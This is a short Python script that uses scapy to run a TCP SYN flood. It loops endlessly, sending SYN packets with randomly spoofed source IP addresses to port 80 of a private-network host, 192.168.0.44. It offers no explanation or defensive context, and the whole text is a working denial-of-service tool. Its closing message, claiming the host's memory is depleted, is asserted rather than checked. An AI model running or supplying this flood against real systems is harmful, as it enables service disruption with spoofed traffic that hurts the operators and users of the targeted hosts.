#!/usr/bin/env python

from scapy.all import *

dst = "192.168.0.44"
seq = 0

try:
    while(True):
        src = RandIP()
        seq = seq + 1

        ip=IP(src=src, dst=dst)
        syn=TCP(dport=80,flags='S',sport=80)

        send(ip/syn, verbose=0)
except:
    print("Host memory depleted. Packets sent:", seq)
